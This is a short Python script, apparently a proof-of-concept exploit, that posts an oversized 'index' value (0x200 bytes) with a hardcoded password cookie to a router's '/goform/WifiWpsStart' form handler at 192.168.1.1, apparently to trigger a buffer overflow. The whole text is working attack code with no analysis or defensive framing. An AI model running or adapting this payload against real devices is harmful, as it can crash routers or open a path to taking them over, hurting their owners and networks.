import requests
def send_payload(url, payload):
    params={
            'index':payload,
            'mode':b'1',}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x200+b'\n'
url="http://192.168.1.1/goform/WifiWpsStart"
send_payload(url, payload)   